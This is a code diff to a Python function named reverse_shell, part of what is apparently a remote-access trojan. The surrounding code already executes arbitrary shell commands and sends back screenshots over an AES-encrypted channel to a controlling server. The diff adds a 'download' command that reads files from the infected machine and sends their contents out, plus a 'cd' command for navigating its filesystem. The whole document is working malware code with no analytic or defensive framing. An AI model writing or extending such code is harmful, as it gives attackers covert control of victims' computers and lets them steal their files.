@@ -92,6 +92,31 @@ def reverse_shell(server_ip, server_port):
                     encrypted_screenshot = aes_encrypt(screenshot_data, key)
                     send_with_size(client, encrypted_screenshot)
                 send_with_size(client, b"")
+            elif command.startswith("download"):
+                files = command.split()[1:]
+                for filename in files:
+                    if os.path.exists(filename) and os.path.isfile(filename):
+                        try:
+                            with open(filename, "rb") as f:
+                                content = f.read()
+                            encrypted_filename = aes_encrypt(filename.encode('utf-8'), key)
+                            send_with_size(client, encrypted_filename)
+                            encrypted_content = aes_encrypt(content, key)
+                            send_with_size(client, encrypted_content)
+                        except:
+                            pass
+                send_with_size(client, b"")
+            elif command.lower().startswith("cd"):
+                try:
+                    target_dir = command[3:].strip()
+                    if not target_dir:
+                        target_dir = os.path.expanduser("~")
+                    os.chdir(target_dir)
+                    output = f"Changed directory to {os.getcwd()}"
+                except Exception as e:
+                    output = str(e)
+                encrypted_output = aes_encrypt(output.encode('utf-8'), key)
+                send_with_size(client, encrypted_output)
             else:
                 output = subprocess.getoutput(command)
                 encrypted_output = aes_encrypt(output.encode('utf-8'), key)
